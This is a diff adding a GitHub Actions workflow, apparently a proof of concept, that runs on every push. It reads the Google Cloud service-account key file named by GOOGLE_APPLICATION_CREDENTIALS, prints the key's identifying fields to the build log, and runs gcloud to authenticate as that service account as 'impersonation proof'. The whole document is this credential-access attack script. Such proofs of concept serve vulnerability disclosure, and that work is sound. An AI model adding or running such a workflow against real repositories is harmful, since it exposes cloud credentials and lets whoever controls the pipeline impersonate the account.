@@ -1,0 +1,24 @@
+name: PoC - SA Credentials Access
+on: [push]
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print SA credentials info (non-destructive)
+        run: |
+          echo "=== SA CREDENTIALS FILE PATH ==="
+          echo "GOOGLE_APPLICATION_CREDENTIALS=$GOOGLE_APPLICATION_CREDENTIALS"
+          echo "GCP_PROJECT=$GCP_PROJECT"
+          echo "=== SA JSON KEY INFO ==="
+          cat $GOOGLE_APPLICATION_CREDENTIALS | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+print('type:', d.get('type'))
+print('project_id:', d.get('project_id'))
+print('client_email:', d.get('client_email'))
+print('client_id:', d.get('client_id'))
+print('auth_uri:', d.get('auth_uri'))
+"
+          echo "=== IMPERSONATION PROOF ==="
+          gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS
+          gcloud config get-value account
